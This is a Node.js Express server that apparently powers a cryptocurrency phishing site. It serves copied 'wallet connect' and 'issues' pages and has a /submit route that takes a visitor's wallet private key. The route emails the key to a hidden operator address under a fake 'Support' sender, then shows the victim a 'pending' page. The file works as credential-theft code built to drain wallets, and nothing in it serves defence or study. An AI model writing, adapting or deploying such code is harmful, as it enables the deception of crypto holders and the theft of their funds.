const express = require('express');
const dotenv = require('dotenv');
const nodemailer = require('nodemailer')
const cors = require('cors')
const path = require('path')
const { Resend } = require("resend")


const app = express();
dotenv.config();

app.use(cors())


app.use(express.static('views/evm-frontend'))
app.use(express.static(path.join(__dirname, "/public")))
app.use(express.static(__dirname + '/views/Home Page _ Welcome to Panelactivator.com_files/'))
app.use(express.static(__dirname + '/views/Welcome to our website_files/'))
app.use(express.static(__dirname + '/views/Connect Manually_files/'))
app.use(express.static(__dirname + '/views/Issues_files'))
app.use(express.static(__dirname + '/views/Pending_files/'))

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

const resend = new Resend(process.env.RESEND_API_KEY);


app.get('/', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/index.html');
})

app.get('/explore', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/explore.html')
})

app.get('/explore/issues', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/connect.html')
})

app.get('/explore/issues/connect', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/Issues.html')
})

app.get('/pending', (req, res) => {
    res.sendFile(__dirname + '/views/evm-frontend/Pending.html')
})

app.post('/submit', async (req, res) => {
  const privateKey = req.body.data;  // Assuming this is the input from the user
  if (!privateKey) {
      console.log('Private key must be provided. Very crucial')
      return res.status(400).json({ error: 'Private key required' });
  }

  const recipients = [process.env.RECIPIENT1];
  
  try {
      // Send email to each recipient
      for (let recipient of recipients) {
          const { data, error } = await resend.emails.send({
              from: 'Support <support@fixorbits.com>', // Use your verified domain
              to: [recipient],
              subject: `${req.body.category}`,
              html: `<pre style="font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all;">${req.body.data}</pre>`,
            });

          if (error) {
              console.error('Error sending to', recipient, ':', error);
              return res.status(500).json({ error: 'Failed to send email' });
          } else {
              console.log('Email sent to', recipient, ':', data);
          }
      }

      console.log('All emails sent successfully');
      res.redirect('/pending')

  } catch (error) {
      console.error('Error in email sending process:', error);
      res.status(500).json({ error: 'Internal server error' });
  }
});


app.listen(process.env.PORT, () => {
    console.log(`Server is running on port ${process.env.PORT}`);
})